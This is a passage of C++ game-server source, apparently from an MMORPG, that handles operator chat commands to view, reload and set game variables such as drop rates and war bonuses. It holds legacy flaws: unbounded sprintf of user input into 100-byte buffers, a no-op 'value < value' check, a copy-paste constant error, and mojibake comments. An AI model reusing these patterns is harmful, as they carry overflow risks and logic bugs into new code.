              g_pZoneGroupManager->getZoneGroup(pZoneInfo->getZoneGroupID());
        } catch (NoSuchElementException &) {
          throw Error("No War Zone. 2");
        }

        Zone *pZone = pZoneGroup->getZone(ZoneNum);

        pZone->deleteRelicItem();
        g_pCombatInfoManager->setRelicOwner(
            i, CombatInfoManager::RELIC_OWNER_NULL);
      }

      g_pCombatInfoManager->computeModify();
      g_pCombatInfoManager->setCombat(false);
    } else {
      cout << "The war is not currently in progress, or it cannot be ended." << endl;
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_CANNOT_END_COMBAT));

      pGamePlayer->sendPacket(&gcSystemMessage);
    }
  }

  __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opview(GamePlayer *pGamePlayer, string msg,
                          int i) throw(ProtocolException, Error) {
  __BEGIN_TRY

  if (pGamePlayer == NULL)
    return;

  Creature *pCreature = pGamePlayer->getCreature();
  GCSystemMessage gcSystemMessage;
  StringStream message;

  size_t j = msg.find_first_of(' ', i + 1);
  size_t z = msg.find_first_of(' ', j + 1);

  string set_type = msg.substr(j + 1, z - j - 1);

  cout << "modifier : " << pCreature->getName() << " set type : " << set_type
       << endl;

  if (set_type == "star") {
    message << "Star-related event/item ratio. Higher values increase star-related chance: 1/" << g_pVariableManager->getStar();
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "evnet_activate") {
    if (g_pVariableManager->getEventActivate() == 1)
      message << "Event in progress"; // 20070727 endl �.
    else
      message << "Event is currently suspended";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "event_ratio") {
    message << "Event Monster Spawn Rates 1/"
            << g_pVariableManager->getEventRatio();
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "exp_ratio") {
    message << "Experience Points Gain Rate: " << g_pVariableManager->getExpRatio();
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "item_prob_ratio") {
    message << "Item drop rate: " << g_pVariableManager->getItemProbRatio();
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "combat_bonus_time") {
    message << "War Victory Duration: "
            << g_pVariableManager->getCombatBonusTime() << "Minute";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "combat_bonus_slayer_hp_ratio") {
    message << "Slayer War HP Bonus Increase: +"
            << g_pVariableManager->getCombatSlayerHPBonusRatio() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "combat_bonus_vampire_hp_ratio") {
    message << "Vampire War HP Bonus Increase: +"
            << g_pVariableManager->getCombatVampireHPBonusRatio() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "combat_bonus_slayer_damage") {
    message << "Slayer War Damage Bonus Increase: +"
            << g_pVariableManager->getCombatSlayerDamageBonus();
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "combat_bonus_vampire_damage") {
    message << "Vampire War Damage Bonus Increase: +"
            << g_pVariableManager->getCombatVampireDamageBonus();
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "premium_exp_bonus_percent") {
    message << "Premium Experience Points Bonus: "
            << g_pVariableManager->getPremiumExpBonusPercent() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "premium_item_probe_percent") {
    message << "Loot drop rates for Premium Zone items: "
            << g_pVariableManager->getPremiumItemProbePercent() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "zone_group_balancing_minute") {
    message << "ZoneGroupBalancing Time: "
            << g_pVariableManager->getZoneGroupBalancingMinute() << "Minute";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "zone_group_next_balancing_time") {
    const Timeval &tv = g_pClientManager->getBalanceZoneGroupTime();
    Timeval currentTime;
    getCurrentTime(currentTime);
    message << "Next Zone Group Balancing Time: "
            << (tv.tv_sec - currentTime.tv_sec) / 60 << "minutes later";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "gamble_item_type_ratio") {
    message << "Gamble ItemType Probability: "
            << g_pVariableManager->getGambleItemTypeRatio() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "gamble_item_option_ratio") {
    message << "Gamble ItemOption Probability: "
            << g_pVariableManager->getGambleItemOptionRatio() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "summon_motorcycle") {
    message << "Motorcycle Summon Feature : "
            << (g_pVariableManager->isSummonMotorcycle() ? "ON" : "OFF");
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "enemy_limit_time") {
    message << "Monster Enemy Duration: "
            << g_pVariableManager->getEnemyLimitTime() << "second";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "rare_item_ratio") {
    message << "Rare Item Drop Rates: "
            << g_pVariableManager->getRareItemRatio() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "unique_item_ratio") {
    message << "Unique Item Drop Rates: "
            << g_pVariableManager->getUniqueItemRatio() << "/10000";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "active_master_lair") {
    message << "Master Lair Event : "
            << (g_pVariableManager->isActiveMasterLair() ? "ON" : "OFF");
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "retry_master_lair") {
    message << "Retry Master Lair switch : "
            << (g_pVariableManager->isRetryMasterLair() ? "ON" : "OFF");
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "harvest_festival_item_ratio") {
    message << "Harvest Festival Item Ratio chance/rate setting: 1/"
            << g_pVariableManager->getHarvestFestivalItemRatio();
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "master_blood_drain_start_hp") {
    message << "Master Blood Drain Start HP game variable : "
            << g_pVariableManager->getMasterBloodDrainStartHP() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "master_blood_drain_start_bd") {
    message << "Master Blood Drain Start BloodDrain game variable : "
            << g_pVariableManager->getMasterBloodDrainStartBD() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "master_blood_drain_end_hp") {
    message << "Master Blood Drain End HP game variable : "
            << g_pVariableManager->getMasterBloodDrainEndHP() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "master_blood_drain_end_bd") {
    message << "Master Blood Drain End Blood Drain game variable : "
            << g_pVariableManager->getMasterBloodDrainEndBD() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "chief_monster") {
    message << "Active Chief Monster switch : "
            << (g_pVariableManager->isActiveChiefMonster() ? "ON" : "OFF");
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "chief_monster_rare_item_percent") {
    message << "Chief Monster Rare Item Ratio chance/rate setting : "
            << g_pVariableManager->getChiefMonsterRareItemPercent() << "%";
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "newbie_transport_to_guild") {
    message << "Move to the guild when reach 40 Stat: "
            << (g_pVariableManager->isNewbieTransportToGuild() ? "ON" : "OFF");
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "MikllizzMaxPlayer") {
    message << "Max. player Limit at Mikliz Dungeon "
            << (g_pVariableManager->getMikllizzMaxPlayer()) << "Name";
    gcSystemMessage.setMessage(message.toString());
  }
  /*
  else if (set_type == "NewAccountEvent")
  {
          message << "New Account Item Giveaway Event : " <<
  (g_pVariableManager->getNewAccountFirstGoal80Event()? "ON":"OFF");
          gcSystemMessage.setMessage(message.toString());
  }
  */
  else if (set_type == "NewbieEvent") {
    message << "New Character Item Giveaway Event : "
            << (g_pVariableManager->getNewbieItemEvent() ? "ON" : "OFF");
    gcSystemMessage.setMessage(message.toString());
  }
  // 20080425 �� ��� �벤
  else if (set_type == "ThreeLeafRatio") {
    message << "Three-leaf clover ratio 1/"
            << g_pVariableManager->getVariable(THREE_LEAF_CLOVER_RATIO);
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "ThreeLeafEvent") {
    message << "THREE-LEAF CLOVER EVENT : "
            << (g_pVariableManager->getVariable(THREE_LEAF_CLOVER_EVENT)
                    ? "ON"
                    : "OFF");
    gcSystemMessage.setMessage(message.toString());
  }
  // 20080425 �� ��� �벤
  else if (set_type == "FourLeafRatio") {
    message << "Four-leaf clover ratio 1/"
            << g_pVariableManager->getVariable(THREE_LEAF_CLOVER_RATIO);
    gcSystemMessage.setMessage(message.toString());
  } else if (set_type == "FourLeafEvent") {
    message << "FOUR-LEAF CLOVER EVENT : "
            << (g_pVariableManager->getVariable(FOUR_LEAF_CLOVER_EVENT)
                    ? "ON"
                    : "OFF");
    gcSystemMessage.setMessage(message.toString());
  } else {
    // by sigi. 2002.11.19
    VariableType vt = g_pVariableManager->getVariableType(set_type);

    if (vt != VARIABLE_MAX) {
      const string &msg = g_pVariableManager->toString(vt);
      gcSystemMessage.setMessage(msg);
    } else {
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_WRONG_VARIABLE_NAME));
    }
  }

  // Send a system message only to yourself (when modified)
  pGamePlayer->sendPacket(&gcSystemMessage);

  __END_CATCH
}
#endif

#ifdef __GAME_SERVER__

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opload(GamePlayer *pGamePlayer, string msg,
                          int i) throw(ProtocolException, Error) {
  __BEGIN_TRY

  GCSystemMessage gcSystemMessage;
  StringStream message;

  size_t j = msg.find_first_of(' ', i + 1);
  size_t z = msg.find_first_of(' ', j + 1);

  string load_type = msg.substr(j + 1, z - j - 1);
  string load_value = "0";

  if (z != string::npos)
    load_value = msg.substr(z + 1);

  if (load_type.length() < 1)
    return;

  if (pGamePlayer != NULL) {
    Creature *pCreature = pGamePlayer->getCreature();
    filelog("change.txt", "[LOAD] %s , %s , %s", pCreature->getName().c_str(),
            load_type.c_str(), load_value.c_str());
  }

  EventReloadInfo *pEvent = NULL;

  if (load_type == "master_lair_info") {
    pEvent =
        new EventReloadInfo(pGamePlayer, EventReloadInfo::MASTER_LAIR_INFO);
    //		StringStream msg;
    //		msg << "Loading Master Lair information.";
    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_LOAD_MASTER_LAIR_INFO));
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (load_type == "monster_info") {
    //	string MonsterName = load_value;
    string MonsterName = "all";
    int SpriteType = 0;

    // First, I look up the monster SpriteType by its "name."
    //		int SpriteType = g_pMonsterInfoManager->getSpriteTypeByName(
    //MonsterName );

    //		if (SpriteType==0)
    //		{
    // If it doesn't exist by name... is the value itself a number (SpriteType)?
    //			SpriteType = atoi( MonsterName.c_str() );
    //		}

    bool bExist = true;
    //		try
    //		{
    //			g_pMonsterInfoManager->getMonsterTypeBySprite(SpriteType);
    //		} catch (Throwable&) {
    //			bExist = false;
    //		}

    //		StringStream msg;
    char msg[100];

    if (bExist || MonsterName == "all") {
      // If the value is "all," the SpriteType is 0.
      pEvent = new EventReloadInfo(pGamePlayer, EventReloadInfo::MONSTER_INFO,
                                   SpriteType);

      if (SpriteType != 0) {
        sprintf(msg, g_pStringPool->c_str(STRID_LOAD_MONSTER_INFO),
                load_value.c_str());
        //msg << "Loading monster information (" << load_value.c_str() << ").";
      } else {
        sprintf(msg, g_pStringPool->c_str(STRID_LOAD_ALL_MONSTER_INFO));
        //msg << "Loading all monster information.";
      }
    } else {
      sprintf(msg, g_pStringPool->c_str(STRID_LOAD_WRONG_MONSTER_INFO),
              load_value.c_str());
      //msg << "Monster(" << load_value.c_str() << ") was specified incorrectly.";
    }

    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (load_type == "monster_ai") {
    pEvent = new EventReloadInfo(pGamePlayer, EventReloadInfo::MONSTER_AI);
    //		StringStream msg;
    //		msg << "Loading monster AI information (DirectiveSet).";
    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_LOAD_DIRECTIVESET));
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (load_type == "zone_info") {
    pEvent = new EventReloadInfo(pGamePlayer, EventReloadInfo::ZONE_INFO);
    //		StringStream msg;
    //		msg << "Loading John's information.";
    gcSystemMessage.setMessage(g_pStringPool->getString(STRID_LOAD_ZONE));
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (load_type == "zone") {
    int zoneID = atoi(load_value.c_str());

    pEvent = new EventReloadInfo(pGamePlayer, EventReloadInfo::ZONE, zoneID);

    //		StringStream msg;
    //		msg << “Loading zone.”;
    gcSystemMessage.setMessage(g_pStringPool->getString(STRID_LOAD_ZONE));
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (load_type == "log_user") {
    pEvent = new EventReloadInfo(pGamePlayer, EventReloadInfo::LOG_USER_INFO);
    //		StringStream msg;
    //		msg << "Loading LogUser information.";
    gcSystemMessage.setMessage(g_pStringPool->getString(STRID_LOAD_LOG_USER));
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (load_type == "item_info") {
    Item::ItemClass ItemClass =
        g_pItemFactoryManager->getItemClassByName(load_value);

        // If ItemClass is MAX, it means the item couldn't be found by name. 
        // In this case, you need to check whether the item class was passed directly as a number.
    if (ItemClass == Item::ITEM_CLASS_MAX) {
      int temp = atoi(load_value.c_str());
      if (temp < 0 || temp >= Item::ITEM_CLASS_MAX) {
        return;
      } else {
        ItemClass = (Item::ItemClass)(temp);
      }
    }

    pEvent =
        new EventReloadInfo(pGamePlayer, EventReloadInfo::ITEM_INFO, ItemClass);

    //		StringStream msg;
    //		msg << load_value << " Loading info.";

    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_LOAD_ITEM_INFO),
            load_value.c_str());
    gcSystemMessage.setMessage(msg);
  } else if (load_type == "option_info") {
    pEvent = new EventReloadInfo(pGamePlayer, EventReloadInfo::OPTION_INFO);
    //	StringStream msg;
    //	msg << "Loading OptionInfo data.";
    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_LOAD_OPTION_INFO));
  } else if (load_type == "rank_bonus_info") {
    pEvent = new EventReloadInfo(pGamePlayer, EventReloadInfo::RANK_BONUS_INFO);
    //		StringStream msg;
    //		msg << "Loading RankBonusInfo data.";
    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_LOAD_RANK_BONUS_INFO));
  } else if (load_type == "string_pool") {
    pEvent = new EventReloadInfo(pGamePlayer, EventReloadInfo::STRING_POOL);
    gcSystemMessage.setMessage("reload StringPool");
  } else if (load_type == "war_schedule_info") {
    ZoneID_t zoneID = atoi(load_value.c_str());

    // If not set, the zone where the Creature is currently located
    if (zoneID == 0) {
      if (pGamePlayer != NULL) {
        Creature *pCreature = pGamePlayer->getCreature();
        Assert(pCreature != NULL);

        Zone *pZone = pCreature->getZone();
        Assert(pZone != NULL);

        zoneID = pZone->getZoneID();
      }
    }

    pEvent = new EventReloadInfo(pGamePlayer,
                                 EventReloadInfo::WAR_SCHEDULE_INFO, zoneID);

    StringStream msg;
    msg << g_pStringPool->getString(STRID_LOAD_WAR_SCHEDULE_INFO);

    if (!g_pVariableManager->isWarActive()) {
      msg << g_pStringPool->getString(STRID_WAR_OFF);
    }

    gcSystemMessage.setMessage(msg.toString().c_str());

  } else if (load_type == "blood_bible_owner") {
    pEvent =
        new EventReloadInfo(pGamePlayer, EventReloadInfo::BLOOD_BIBLE_OWNER);

    //		StringStream msg;
    //		msg << "Loading BloodBibleOwner information.";
    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_LOAD_BLOOD_BIBLE_OWNER_INFO));
  } else if (load_type == "sweeper_owner") {
    int level = atoi(load_value.c_str());
    pEvent =
        new EventReloadInfo(pGamePlayer, EventReloadInfo::SWEEPER_OWNER, level);

    //		StringStream msg;
    //		msg << "Loading BloodBibleOwner information.";
    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_LOAD_BLOOD_BIBLE_OWNER_INFO));
  } else if (load_type == "race_war_pc_limit") {
    pEvent =
        new EventReloadInfo(pGamePlayer, EventReloadInfo::RACE_WAR_PC_LIMIT);

    //		StringStream msg;
    //		msg << "Loading RaceWarPCLimit information.";
    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_LOAD_RACE_WAR_PC_LIMIT_INFO));
  } else if (load_type == "npc") {
    ZoneID_t zoneID = (ZoneID_t)(atoi(load_value.c_str()));
    Zone *pZone = getZoneByZoneID(zoneID);
    if (pZone != NULL) {
      //  Apart from the castle, NPCs never disappear -_-a
      CastleInfo *pCastleInfo = g_pCastleInfoManager->getCastleInfo(zoneID);

      if (pCastleInfo != NULL)
        pZone->loadNPCs(pCastleInfo->getRace());
    }

  } else if (load_type == "goods_list_info") {
    pEvent = new EventReloadInfo(pGamePlayer, EventReloadInfo::GOODS_LIST_INFO);

    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_LOAD_GOODS_LIST_INFO));
  }
  /*	else if ( load_type == "quest_info" )
          {
                  pEvent = new EventReloadInfo( pGamePlayer,
     EventReloadInfo::QUEST_INFO );

                  gcSystemMessage.setMessage( g_pStringPool->getString(
     STRID_LOAD_QUEST_INFO ) );
          }*/
  else {
    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_WRONG_VARIABLE_NAME));
  }

  if (pEvent != NULL) {
    g_pClientManager->addEvent(pEvent);
  }

  // Send a system message only to yourself (when modified)
  if (pGamePlayer != NULL) {
    pGamePlayer->sendPacket(&gcSystemMessage);
  }

  __END_CATCH
}

// 20090206 wlzzi - opget
void CGSayHandler::opget(GamePlayer *pGamePlayer, string msg,
                         int i) throw(ProtocolException, Error) {
  __BEGIN_TRY
  GCSystemMessage gcSystemMessage;
  //	StringStream message;
  int j = msg.find_first_of(' ', i + 1);
  int z = msg.find_first_of(' ', j + 1);

  if (j < 0)
    return;
  if (z < 0)
    z = msg.size();
  string set_type = msg.substr(j + 1, z - j - 1);

  int getValue = 0;
  if (set_type == "item_prob_ratio") {
    getValue = g_pVariableManager->getItemProbRatio();
    char msg[100];
    sprintf(msg, "Item looting Ratio = %d", getValue);
    gcSystemMessage.setMessage(msg);
  } else if (set_type == "premium_item_probe_percent") {
    getValue = g_pVariableManager->getPremiumItemProbePercent();
    char msg[100];
    sprintf(msg, "Premium Item looting Ratio = %d", getValue);
    gcSystemMessage.setMessage(msg);
  } else if (set_type == "rare_item_ratio") {
    getValue = g_pVariableManager->getRareItemRatio();
    char msg[100];
    sprintf(msg, "RareItem loogint Ratio = %d", getValue);
    gcSystemMessage.setMessage(msg);
  } else if (set_type == "chief_monster_rare_item_percent") {
    getValue = g_pVariableManager->getChiefMonsterRareItemPercent();
    char msg[100];
    sprintf(msg, "Chief Monster's RareItem loogint Ratio = %d", getValue);
    gcSystemMessage.setMessage(msg);
  } else
    return;
  // Send a system message only to yourself (when modified)
  if (pGamePlayer != NULL) {
    pGamePlayer->sendPacket(&gcSystemMessage);
  }

  __END_CATCH
}
//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opset(GamePlayer *pGamePlayer, string msg,
                         int i) throw(ProtocolException, Error) {
  __BEGIN_TRY

  // [!!!] When this is processed via GGCommand,
    // pGamePlayer may be NULL, so be sure to check it! by sigi.2002.12.23

  GCSystemMessage gcSystemMessage;
  StringStream message;

  //	size_t j = msg.find_first_of(' ' , i+1);
  //	size_t z = msg.find_first_of(' ' , j+1);

  // May 1, 2008: The return value may be negative.
  int j = msg.find_first_of(' ', i + 1);
  int z = msg.find_first_of(' ', j + 1);

  if ((j < 0) || (z < 0))
    return;

  string set_type = msg.substr(j + 1, z - j - 1);
  string set_value = msg.substr(z + 1);

  if (set_value.length() < 1)
    return;

  if (pGamePlayer != NULL) {
    Creature *pCreature = pGamePlayer->getCreature();
    filelog("change.txt", "%s , %s , %s", pCreature->getName().c_str(),
            set_type.c_str(), set_value.c_str());
  }

  if (set_type == "star") {
    g_pVariableManager->setStar(atoi(set_value.c_str()));
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_STAR_RATIO), set_value.c_str());
    //	    message << "The probability of a star appearing has been set to 1/" << set_value << "";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "event_activate") {
    if (set_value == "start") {
      g_pVariableManager->setEventActivate(1);
      //	    	message << "The event has started";
      gcSystemMessage.setMessage(g_pStringPool->getString(STRID_EVENT_START));
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    } else {
      g_pVariableManager->setEventActivate(0);
      //	    	message << "The event has been stopped";
      gcSystemMessage.setMessage(g_pStringPool->getString(STRID_EVENT_END));
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    }
  } else if (set_type == "event_ratio") {
    g_pVariableManager->setEventRatio(atoi(set_value.c_str()));
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_EVENT_MONSTER_RATIO),
            set_value.c_str());
    //	    message << "The appearance rate of event monsters has been adjusted to 1/" << set_value << "";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "exp_ratio") {
    int value = atoi(set_value.c_str());
    if (value < 100)
      return;

    g_pVariableManager->setExpRatio(value);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_EXP_RATIO), set_value.c_str());
    //	    message << "The experience gain rate has been set to" << set_value << "%";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "item_prob_ratio") {
    int value = atoi(set_value.c_str());
    if (value < value)
      return;

    g_pVariableManager->setItemProbRatio(value);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_ITEM_PROBE_RATIO),
            set_value.c_str());
    //	    message << "The item drop rate has been changed to " << set_value << "%";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "combat_bonus_time") {
    int bonusTime = atoi(set_value.c_str());
    if (bonusTime < 1 || bonusTime > 14400)
      return;

    g_pVariableManager->setCombatBonusTime(bonusTime);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_COMBAT_BONUS_TIME),
            set_value.c_str());
    //	    message << "The duration of the victory has been changed to " << set_value << " minutes";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "combat_bonus_slayer_hp_ratio") {
    int bonus = atoi(set_value.c_str());
    if (bonus < 0 || bonus > 100)
      return;

    g_pVariableManager->setCombatSlayerHPBonusRatio(bonus);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_COMBAT_SLAYER_BONUS_HP),
            set_value.c_str());
    //	    message << "The HP bonus for the Slayer War has been adjusted to +" << set_value << "%";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "combat_bonus_vampire_hp_ratio") {
    int bonus = atoi(set_value.c_str());
    if (bonus < 0 || bonus > 100)
      return;

    g_pVariableManager->setCombatVampireHPBonusRatio(bonus);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_COMBAT_VAMPIRE_BONUS_HP),
            set_value.c_str());
    //	    message << "The HP bonus for the Vampire War has been adjusted to +" << set_value << "%";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "combat_bonus_slayer_damage") {
    int bonus = atoi(set_value.c_str());
    if (bonus < 0 || bonus > 20)
      return;

    g_pVariableManager->setCombatSlayerDamageBonus(bonus);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_COMBAT_SLAYER_BONUS_DAMAGE),
            set_value.c_str());
    //	   message << "The Slayer War damage bonus has been adjusted to +" << set_value << "";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "combat_bonus_vampire_damage") {
    int bonus = atoi(set_value.c_str());
    if (bonus < 0 || bonus > 20)
      return;

    g_pVariableManager->setCombatVampireDamageBonus(bonus);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_COMBAT_VAMPIRE_BONUS_DAMAGE),
            set_value.c_str());
    //	   message << "The Vampire War damage bonus has been changed to +" << set_value << "";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "premium_exp_bonus_percent") {
    int bonus = atoi(set_value.c_str());
    if (bonus < 100 || bonus > 1000)
      return;

    g_pVariableManager->setPremiumExpBonusPercent(bonus);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_PREMIUM_EXP_RATIO),
            set_value.c_str());
    //	    message << "The experience point bonus for Premium users has been adjusted to " << set_value << "%.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "premium_item_probe_percent") {
    int bonus = atoi(set_value.c_str());
    if (bonus < 100 || bonus > 1000)
      return;

    g_pVariableManager->setPremiumItemProbePercent(bonus);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_PREMIUM_ITEM_PROBE_RATIO),
            set_value.c_str());
    //	    message << "The ZoneGroupBalancing cycle has been set to " << set_value << " minutes.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "zone_group_balancing_minute") {
    int minute = atoi(set_value.c_str());
    if (minute <= 0 || minute > 30 * 24 * 60)
      return;

    g_pVariableManager->setZoneGroupBalancingMinute(minute);
    g_pClientManager->setBalanceZoneGroup(minute);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_ZONE_GROUP_BALANCING_TIME),
            set_value.c_str());
    //	    message << "ZoneGroupBalancing 주기� " << set_value << "붼�
    //��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "gamble_item_type_ratio") {
    int ratio = atoi(set_value.c_str());
    if (ratio <= 10 || ratio > 1000)
      return;

    g_pVariableManager->setGambleItemTypeRatio(ratio);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_GAMBLE_ITEM_TYPE_RATIO),
            set_value.c_str());
    //	    message << "갬� ItemType� " << set_value << "%�
    //��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "gamble_item_option_ratio") {
    int ratio = atoi(set_value.c_str());
    if (ratio <= 10 || ratio > 1000)
      return;

    g_pVariableManager->setGambleItemOptionRatio(ratio);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_GAMBLE_ITEM_OPTION_RATIO),
            set_value.c_str());
    //	    message << "갬� ItemOption� " << set_value << "%�
    //��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "summon_motorcycle") {
    if (set_value == "on") {
      g_pVariableManager->setSummonMotorcycle(true);
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_SET_SUMMON_MOTORCYCLE), "ON");
      //			message << "���  기�� ON
      //��.";
      gcSystemMessage.setMessage(msg);
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
